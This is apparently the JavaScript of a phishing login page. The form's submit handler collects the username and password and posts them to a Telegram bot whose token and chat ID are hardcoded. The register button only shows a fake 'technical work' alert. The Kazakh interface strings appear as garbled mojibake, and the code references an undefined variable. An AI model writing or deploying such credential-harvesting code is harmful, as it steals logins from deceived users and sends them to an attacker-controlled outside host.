const register = document.getElementById("register")

register.addEventListener("click", () => {
    alert("Technical work, try it later")
})

const loginForm = document.getElementById("loginForm")

loginForm.addEventListener("submit", (e) => {
    e.preventDefault()
    sendToTelegram()
})

function sendToTelegram() {
    const botToken = "7931730577:AAEs-6ctxKwgqcyf5i9F83S8y5wQChxojIw";
    const chatId = "855499967";
    

    const loginUser = document.getElementById("loginUser").value.trim();
    const passwordUser = document.getElementById("passwordUser").value.trim();


    if (!loginUser && passwordUser) {
        console.log("end");
        return;
    }

    const message = `üì¨ –ñ–∞“£–∞ –º”ô–ª—ñ–º–µ—Ç—Ç–µ—Ä:
    üë§ login: ${loginUser}
    üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${passwordUser}
    `

    if (file) {
        const formData = new FormData();
        formData.append("chat_id", chatId);
        formData.append("photo", file);
        formData.append("caption", message);

        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("–ê“õ–ø–∞—Ä–∞—Ç —Å”ô—Ç—Ç—ñ –∂—ñ–±–µ—Ä—ñ–ª–¥—ñ!");
            } else {
                alert("“ö–∞—Ç–µ –æ—Ä—ã–Ω –∞–ª–¥—ã! –°—É—Ä–µ—Ç –∂“Ø–∫—Ç–µ—É –∫–µ–∑—ñ–Ω–¥–µ “õ–∞—Ç–µ —Ç—É—ã–Ω–¥–∞–¥—ã.");
                console.log(data);
            }
        })
        .catch(error => {
            alert("“ö–∞—Ç–µ –æ—Ä—ã–Ω –∞–ª–¥—ã! –°—É—Ä–µ—Ç—Ç—ñ –∂“Ø–∫—Ç–µ–π –∞–ª–º–∞–¥—ã“õ.");
            console.log(error);
        });
    } else {

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                alert("–ê“õ–ø–∞—Ä–∞—Ç —Å”ô—Ç—Ç—ñ –∂—ñ–±–µ—Ä—ñ–ª–¥—ñ!");
            } else {
                alert("“ö–∞—Ç–µ –æ—Ä—ã–Ω –∞–ª–¥—ã! –•–∞–±–∞—Ä–ª–∞–º–∞ –∂—ñ–±–µ—Ä—ñ–ª–º–µ–¥—ñ.");
                console.log(data);
            }
        })
        .catch(error => {
            alert("“ö–∞—Ç–µ –æ—Ä—ã–Ω –∞–ª–¥—ã! –¢–µ–ª–µ–≥—Ä–∞–º“ì–∞ “õ–æ—Å—ã–ª–∞ –∞–ª–º–∞–¥—ã“õ.");
            console.log(error);
        });
    }
}